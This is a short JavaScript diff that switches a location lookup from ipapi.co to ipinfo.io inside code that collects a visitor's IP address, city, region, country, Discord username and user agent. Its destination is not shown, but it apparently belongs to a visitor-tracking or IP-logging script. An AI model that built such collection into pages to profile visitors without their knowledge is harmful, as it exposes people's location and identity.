@@ -33,9 +33,10 @@
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
-                const addressResponse = await fetch('https://ipapi.co/json/');
+                // Switched to a different service for fetching location info
+                const addressResponse = await fetch('https://ipinfo.io/json');
                 const addressData = await addressResponse.json();
-                const address = `${addressData.city}, ${addressData.region}, ${addressData.country_name}`;
+                const address = `${addressData.city}, ${addressData.region}, ${addressData.country}`;
 
                 const username = prompt('Please enter your Discord username:');
                 const userAgent = navigator.userAgent;
